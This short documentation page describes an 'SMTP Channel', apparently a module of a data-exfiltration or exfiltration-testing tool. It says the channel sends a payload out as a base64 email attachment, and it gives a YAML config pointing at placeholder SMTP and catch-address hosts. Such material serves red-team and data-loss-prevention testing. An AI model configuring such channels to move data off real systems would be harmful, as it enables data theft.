# SMTP Channel

## Overview
Exfiltrates payload as a base64-encoded MIME attachment over SMTP with STARTTLS.

## Configuration
```yaml
channels:
  smtp:
    enabled: true
    server: "smtp.example.com:587"
    from: "test@example.com"
    to: "catch@your-vps.example.com"
    username: "test@example.com"
    password: "..."
```

## Requirements
- No root required
- Outbound port 587 (STARTTLS) must be permitted
